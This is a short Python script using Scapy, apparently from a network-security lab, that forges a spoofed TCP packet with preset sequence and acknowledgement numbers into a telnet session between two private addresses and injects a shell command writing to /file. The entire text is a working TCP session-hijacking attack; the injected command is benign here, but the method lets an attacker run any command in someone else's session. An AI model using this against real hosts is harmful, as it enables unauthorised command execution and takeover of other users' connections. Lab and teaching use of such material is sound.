from scapy.all import *

ip = IP(src="10.9.0.6", dst="10.9.0.5")
tcp = TCP(sport=35214, dport=23, flags="A", seq=59, ack=2582938057)
data = "echo \"Hello\" > /file"
pkt = ip/tcp/data
ls(pkt)
send(pkt, verbose=0)